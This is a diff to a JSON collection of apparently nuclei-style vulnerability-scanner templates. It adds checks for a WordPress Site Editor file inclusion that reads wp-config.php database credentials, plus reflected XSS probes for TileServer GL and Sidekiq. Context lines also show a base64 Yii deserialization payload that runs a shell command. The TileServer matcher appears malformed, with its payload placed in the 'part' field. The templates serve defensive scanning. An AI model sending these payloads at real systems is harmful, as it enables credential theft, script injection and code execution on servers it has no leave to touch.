@@ -2785,6 +2785,43 @@
       ]
     },
     {
+      "id": "CVE-2018-7422",
+      "info": {
+        "author": "LuskaBol",
+        "description": "A Local File Inclusion vulnerability in the Site Editor plugin through 1.1.1 for WordPress allows remote attackers to retrieve arbitrary files via the ajax_path parameter to editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php.",
+        "name": "WordPress Site Editor Plugin LFI",
+        "reference": "https://www.exploit-db.com/exploits/44340",
+        "severity": "high",
+        "tags": "cve,cve2018,wordpress,wp-plugin,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "DB_NAME",
+                "DB_PASSWORD"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=../../../../../../../wp-config.php"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-7490",
       "info": {
         "author": "madrobot",
@@ -6352,6 +6389,46 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?r=test/sss&data=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6Njoic3lzdGVtIjtzOjI6ImlkIjtzOjY6ImxzIC1hbCI7fWk6MTtzOjM6InJ1biI7fX19fQ=="
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-15500",
+      "info": {
+        "author": "Akash.C",
+        "name": "TileServer GL Reflected XSS",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-15500",
+        "severity": "medium",
+        "source": "https://github.com/maptiler/tileserver-gl/issues/461",
+        "tags": "cve,cve2020,xss,tileserver"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "part": "body - '\"><script>alert(document.domain);</script>'",
+              "type": "word",
+              "words": null
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/?key=%22%3E%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E"
           ]
         }
       ]
@@ -10069,6 +10146,48 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/calendar_form.php/\"><script>alert(document.domain)</script>"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-30151",
+      "info": {
+        "author": "DhiyaneshDk",
+        "description": "Sidekiq through 5.1.3 and 6.x through 6.2.0 allows XSS via the queue name of the live-poll feature when Internet Explorer is used.",
+        "name": "CVE-2021-30151",
+        "reference": "- https://github.com/mperham/sidekiq/issues/4852\n- https://nvd.nist.gov/vuln/detail/CVE-2021-30151\n",
+        "severity": "low",
+        "tags": "cve,cve2021,xss,sidekiq"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "onmouseover=\"alert('nuclei')"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/sidekiq/queues/\"onmouseover=\"alert(nuclei)\""
           ]
         }
       ]
